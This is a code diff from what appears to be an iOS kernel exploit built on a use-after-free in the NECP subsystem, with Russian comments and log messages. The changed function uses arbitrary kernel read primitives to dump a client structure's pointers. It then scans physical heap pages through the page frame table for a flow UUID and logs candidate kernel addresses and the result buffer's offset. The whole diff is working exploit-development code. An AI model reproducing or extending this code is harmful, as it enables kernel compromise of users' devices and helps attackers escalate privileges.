@@ -4153,30 +4153,65 @@ static long kpNecpUafExecute(int fd, const uint8_t *clientUUID,
             uint64_t clientVA = kp_untag_ptr(dataRaw);
             kpNote(r, [NSString stringWithFormat:@"  D: fd=%d copy_result→%ld client=%#llx", fd, rd0, clientVA]);
             if (kpLooksLikeKernelPointer(clientVA)) {
-                uint64_t flowVA = 0;
-                for (uint64_t o = 0; o < 0x400 && !flowVA; o += 8) {
+                // дамп указателей клиента (понять layout клиента)
+                int cshown = 0;
+                for (uint64_t o = 0; o < 0x400 && cshown < 24; o += 8) {
                     uint64_t v = kp_rc_kread64(clientVA + o);
                     uint64_t u = kp_untag_ptr(v);
-                    if (!kpLooksLikeKernelPointer(u)) continue;
-                    uint8_t probe[0x60];
-                    kreadbuf(u, probe, sizeof probe);
-                    for (int so = 0; so <= (int)(sizeof probe) - 16; so += 8)
-                        if (!memcmp(probe + so, liveFlow, 16)) { flowVA = u; break; }
-                }
-                kpNote(r, [NSString stringWithFormat:@"  D: flow=%#llx (uuid найден: %@)", flowVA, flowVA ? @"да" : @"нет — flow глубже"]);
-                if (flowVA) {
-                    int shown = 0;
-                    for (uint64_t o = 0; o < 0x600 && shown < 48; o += 8) {
-                        uint64_t v = kp_rc_kread64(flowVA + o);
-                        uint64_t u = kp_untag_ptr(v);
-                        if (!kpLooksLikeKernelPointer(u)) continue;
-                        uint8_t tgt[16];
-                        kreadbuf(u, tgt, 16);
-                        BOOL matchRes = (rd0 > 0 && !memcmp(tgt, resD, rd0 < 16 ? (size_t)rd0 : 16));
-                        kpNote(r, [NSString stringWithFormat:@"    flow+%#03llx → %#llx%@", (unsigned long long)o, u,
-                                      matchRes ? @"  ◄◄◄ RESULT BUF (контент совпал — ЭТО оффсет указателя!)" : @""]);
-                        shown++;
+                    if (kpLooksLikeKernelPointer(u)) {
+                        kpNote(r, [NSString stringWithFormat:@"    client+%#03llx → %#llx", (unsigned long long)o, u]);
+                        cshown++;
                     }
+                }
+                // flow по heap-скану на uuid (та же техника, что нашла bufB)
+                uint64_t tableVA = [self frameTableVAWithLog:r];
+                uint64_t pb = kconstant(physBase), ps = kconstant(physSize);
+                uint32_t totalPages = (uint32_t)(ps >> 14);
+                uint32_t *heapPages = malloc((size_t)totalPages * 4);
+                if (!heapPages) { kpNote(r, @"  D: malloc fail"); } else {
+                    uint32_t nheap = 0;
+                    uint8_t fch[0x1000];
+                    for (uint32_t base2 = 0; base2 < totalPages; base2 += 256) {
+                        uint32_t n = totalPages - base2; if (n > 256) n = 256;
+                        kreadbuf(tableVA + (uint64_t)base2 * 16, fch, (size_t)n * 16);
+                        for (uint32_t j = 0; j < n; j++)
+                            if (fch[j * 16 + 2] == 0x21) heapPages[nheap++] = base2 + j;
+                    }
+                    kpNote(r, [NSString stringWithFormat:@"  D: heap-страниц (0x21): %u — скан на uuid flow…", nheap]);
+                    int candN = 0;
+                    for (uint32_t i = 0; i < nheap && candN < 4; i++) {
+                        uint64_t pa = pb + ((uint64_t)heapPages[i] << 14);
+                        uint64_t pva = gPrimitives.phystokv(pa);
+                        uint8_t pgch[0x1000];
+                        for (int seg = 0; seg < 4; seg++) {
+                            kreadbuf(pva + (uint64_t)seg * 0x1000, pgch, 0x1000);
+                            for (int q = 0; q <= 0x1000 - 16; q += 8) {
+                                if (!memcmp(pgch + q, liveFlow, 16)) {
+                                    candN++;
+                                    uint64_t matchVA = pva + (uint64_t)seg * 0x1000 + (uint64_t)q;
+                                    kpNote(r, [NSString stringWithFormat:@"★ flow-кандидат #%d: PA=%#llx uuid@+%#x VA=%#llx",
+                                                  candN, pa, seg * 0x1000 + q, matchVA]);
+                                    // дамп окна вокруг матча: указатели + матч resD
+                                    uint64_t wbase = matchVA - 0x100;
+                                    int shown = 0;
+                                    for (uint64_t o = 0; o < 0x700 && shown < 40; o += 8) {
+                                        uint64_t v = kp_rc_kread64(wbase + o);
+                                        uint64_t u = kp_untag_ptr(v);
+                                        if (!kpLooksLikeKernelPointer(u)) continue;
+                                        uint8_t tgt[16];
+                                        kreadbuf(u, tgt, 16);
+                                        BOOL matchRes = (rd0 > 0 && !memcmp(tgt, resD, rd0 < 16 ? (size_t)rd0 : 16));
+                                        kpNote(r, [NSString stringWithFormat:@"    win%+0x%03llx → %#llx%@",
+                                                      (long long)o - 0x100, u,
+                                                      matchRes ? @"  ◄◄◄ RESULT BUF!" : @""]);
+                                        shown++;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    kpNote(r, [NSString stringWithFormat:@"  D: кандидатов на uuid: %d", candN]);
+                    free(heapPages);
                 }
             }
             kpNecpRemoveFlow(fd, liveFlow);
